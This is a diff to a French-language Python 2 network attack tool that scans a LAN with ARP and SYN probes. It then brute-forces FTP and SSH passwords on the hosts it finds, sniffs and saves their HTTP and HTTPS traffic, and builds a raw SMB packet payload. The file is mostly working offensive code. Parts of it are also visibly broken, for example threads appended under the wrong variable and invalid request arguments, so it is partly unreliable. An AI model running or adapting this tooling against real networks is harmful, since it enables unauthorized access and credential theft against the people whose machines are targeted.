@@ -112,12 +112,14 @@ def ssh_conn(log, addr, passwd):
 		pass
 
 def query(port, dst):
-	url 	= dst + ':' + port
+	url 	= '{}:{}'.format(dst, port)
 	cookie	= {'spip_session':pwd_alpha(16, 'alpha')}
+	token	= {'token':pwd_alpha(16, 'alpha')}
 	headers = {'content-type':'application/json'}
 	def upload_pkt(packet):
-    		r = requests.get(url, headers=headers, cookie=cookie)
- 	return uploaded_pkt
+    		r = requests.post(url, data=packet, token=token, headers=headers, cookie=cookie)
+		logger.info("Packet envoyé à {}: {}".format(dst, r.status))
+ 	return upload_pkt
 
 def long2net(arg):
 	if (arg <= 0 or arg >= 0xFFFFFFFF):
@@ -135,7 +137,7 @@ def to_CIDR_notation(bytes_network, bytes_netmask):
 
 def scan_and_print_neighbors(net, interface, timeout=1):
 	global ips_o
-	print "\033[94m[+]\033[0m ARP %s sur %s" % (net, interface)
+	print "\n\033[94m[+]\033[0m ARP %s sur %s" % (net, interface)
 	try:
 		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
 		for s, r in ans.res:
@@ -149,7 +151,7 @@ def scan_and_print_neighbors(net, interface, timeout=1):
 			except KeyboardInterrupt:
 				print '\033[91m[-]\033[0m L\'utilisateur a choisi l\'interruption du process.'
 				break
-			logger.error("\033[92m[*]\033[0m " + line)
+			logger.info("\033[92m[*]\033[0m " + line)
 	except socket.error as e:
 		if e.errno == errno.EPERM:
 			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
@@ -179,11 +181,11 @@ def checkhost(ip):
 			ips_o.append(ip)
         except socket.error as e:
                 if e.errno == errno.EPERM:
-                        logger.error("\033[91m[+]\033[0m %s. Vous n'etes pas root?", e.strerror)
+                        logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
                 else:
                         pass
 	except Exception as e:
-		logger.error("\033[91m[+]\033[0m %s.", e.strerror)
+		logger.error("\033[91m[-]\033[0m %s.", e.strerror)
 		pass
 
 def network_scan(ip):
@@ -205,18 +207,19 @@ def scanner(target):
         		SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
         		pktflags = SYNACKpkt.getlayer(TCP).flags
         		if pktflags == SYNACK:
-				print '\033[96m[+]\033[0m Port Ouvert :', port, 'sur la cible --> ', target
+				logger.info('\033[96m[+]\033[0m Port Ouvert : \033[33m{}\033[0m sur la cible --> {}'.format(port, target))
 				ports_i.append(port)
 	 		else:
 	        		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
 				send(RSTpkt)
+			online[target] = ports_i
 		except KeyboardInterrupt:
 			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
 			send(RSTpkt)
 			print "\n\033[92m[*]\033[0m La requete s'est stoppée sur demande utilisateur."
 		except Exception as e:
-			print e
-	online[target] = ports_i
+			#logger.error("\033[91m[-]\033[0m {}: {}".format(e, target))
+			pass
 
 def port_scan(ip):
 	global ips_o, online
@@ -247,7 +250,7 @@ def port_scan(ip):
 			thr.join()
 	else:
 		sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
-	print '\n\033[92m[*]\033[0m Résumé du scan de ports:\n{}'.format(online)
+	print '\n\033[92m[*]\033[0m Résumé du scan de ports:\n{}\n'.format(online)
 
 def get_ip():
 	try:
@@ -371,7 +374,7 @@ if __name__ == '__main__':
 
 	ips = network_scan(ip)
 	port_scan(ip)
-	
+
 	if args.bruteforce:
 		if args.wordlist is not None:
 			try:
@@ -387,68 +390,69 @@ if __name__ == '__main__':
 			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
 			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
 			dic = generate(args.mode[0], args.longueur[0])
-		
+
 	if online is not None:
 		idx = 0
 		for host in online:
 # FTP ----------------------------------------------------------------------------------------------------------
-			if 21 in online[host]:
-				print "\033[33m[+]\033[0m Cible avec FTP ouvert : %s." % host
-				try:
-					threads = []
-					for item in dic:
-						t = Thread(target=detonate,args=(user,ip,item,))
-						threads.append(t)
-						t.start()
-						idx += 1
-						if ftop == 1:
-							ftop = 0
-							break
-					for thr in threads:
-						thr.join()
-				except KeyboardInterrupt:
-					print '\n[*] Nbr d\'essais '+ str(idx)
-					idx = 0
-				except Exception as e:
-					logger.error("\033[91m[-]\033[0m %s", e.strerror)
+			if args.bruteforce:
+				if 21 in online[host]:
+					print "\n\033[33m[+]\033[0m Cible avec FTP ouvert : %s." % host
+					try:
+						threads = []
+						for item in dic:
+							t = Thread(target=detonate,args=(user,ip,item,))
+							threads.append(t)
+							t.start()
+							idx += 1
+							if ftop == 1:
+								ftop = 0
+								break
+						for thr in threads:
+							thr.join()
+					except KeyboardInterrupt:
+						print '\n[*] Nbr d\'essais '+ str(idx)
+						idx = 0
+					except Exception as e:
+						logger.error("\033[91m[-]\033[0m BF FTP.")
 # SSH ----------------------------------------------------------------------------------------------------------
-			if 22 in online[host]:
-				print "\033[31m[+]\033[0m Cible avec SSH ouvert : %s." % host
-				try:
-					threads = []
-					for psswd in dic:
-						conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
-						threads.append(t)
-						conn.start()
-						idx += 1
-						if flag == 1:
-							flag = 0
-							break
-					for thr in threads:
-						thr.join()
-				except KeyboardInterrupt:
-					print '\n\n[*] Nbr d\'essais '+ str(idx)
-					idx = 0
-				except Exception as e:
-					logger.error("\033[91m[-]\033[0m %s", e.strerror)
+				if 22 in online[host]:
+					print "\n\033[31m[+]\033[0m Cible avec SSH ouvert : %s." % host
+					try:
+						threads = []
+						for psswd in dic:
+							conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
+							threads.append(t)
+							conn.start()
+							idx += 1
+							if flag == 1:
+								flag = 0
+								break
+						for thr in threads:
+							thr.join()
+					except KeyboardInterrupt:
+						print '\n\n[*] Nbr d\'essais '+ str(idx)
+						idx = 0
+					except Exception as e:
+						logger.error("\033[91m[-]\033[0m BF SSH")
 # HTTP ---------------------------------------------------------------------------------------------------------
 			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
-				port_idx = [i for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
-				print "\033[35m[+]\033[0m Sniffing -> Cible avec HTTP ouvert : %s sur le port %d." % (host, port_idx)
-				sniffed = sniff(prn=query(online[host][port_idx], host), 
-						filter="tcp and port " + 
-						str(online[host][port_idx]) + " and host " + host, 
-						count=25)
-				sniffed.nsummary()
-				try:
-					wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
-				except:
-					pass
+				port_idx = [x for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
+				print "\n\033[35m[+]\033[0m Sniffing -> Cible avec HTTP ouvert : {} sur le port {}.".format(host, port_idx[0])
+				for item in port_idx:
+					sniffed = sniff(prn=query(item, host),
+							filter="tcp and port " + str(item) + " and host " + host,
+							count=25)
+					sniffed.nsummary()
+					try:
+						wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
+					except:
+						pass
 # HTTPS --------------------------------------------------------------------------------------------------------
 			if 443 in online[host]:
-				print "\033[1m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
-				sniffed = sniff(prn=query(443, host), 
-						filter="tcp and port 443 and host " + host, 
+				print "\n\033[1m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
+				sniffed = sniff(prn=query(443, host),
+						filter="tcp and port 443 and host " + host,
 						count=25)
 				sniffed.nsummary()
 				try:
@@ -457,7 +461,7 @@ if __name__ == '__main__':
 					pass
 # SMB ----------------------------------------------------------------------------------------------------------
 			if 445 in online[host]:
-				print "\033[36m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
+				print "\n\033[36m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
 				payload = "\x00\x00\x001\xffSMB+\x00\x00\x00\x00\x18C\xc0"+\
                                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"+\
                                           "\x00\x00\xfe\xff\x01\x01\x00\x0c\x00JlJmIhClBsr\x00"
